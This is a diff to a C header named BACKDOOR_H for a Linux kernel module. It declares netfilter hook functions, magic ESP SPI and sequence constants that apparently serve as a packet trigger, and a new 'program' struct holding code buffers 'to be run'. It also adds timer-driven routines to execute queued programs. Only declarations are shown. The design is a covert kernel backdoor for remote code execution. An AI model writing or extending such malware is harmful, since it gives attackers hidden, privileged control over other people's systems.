@@ -6,26 +6,34 @@
 #include <linux/kernel.h>
 #include <linux/version.h>
 #include <linux/fs.h>
-#include <linux/debugfs.h>
 #include <linux/uaccess.h>
 #include <linux/slab.h>
 #include <linux/kthread.h>
 
-/* Netfilter */
-#include <linux/netfilter.h>
-#include <linux/netfilter_ipv4.h>
-#include <linux/ip.h>
-#include <linux/tcp.h>
-#include <net/esp.h>
+MODULE_AUTHOR("Nick Bulischeck");
+MODULE_LICENSE("GPL");
 
 #define DATA_LEN 255
 #define TARGET_SPI 0x48dcd78c
 #define TARGET_SEQ 0xae574ada
-
-MODULE_AUTHOR("Nick Bulischeck");
-MODULE_LICENSE("GPL");
+#define READY 0
+#define FINISHED 1
 
 struct nf_hook_ops;
+
+typedef struct program {
+	/* 0 = ready, 1 = finished */
+	short int state;
+
+	/* Program to be run */
+	void *buffer;
+
+	/* Length of program */
+	unsigned int length;
+
+	/* List entry */
+	struct list_head prog_list;
+} program;
 
 /* Netfilter hook */
 int nfhook_init(void);
@@ -35,5 +43,9 @@ void nfhook_exit(void);
 int create_file(void);
 void execute_file(void);
 void destroy_file(void);
+void execute_ready_programs(struct timer_list *tl);
+
+/* state helpers */
+struct timer_list *create_timer(unsigned long timeout);
 
 #endif /* BACKDOOR_H */
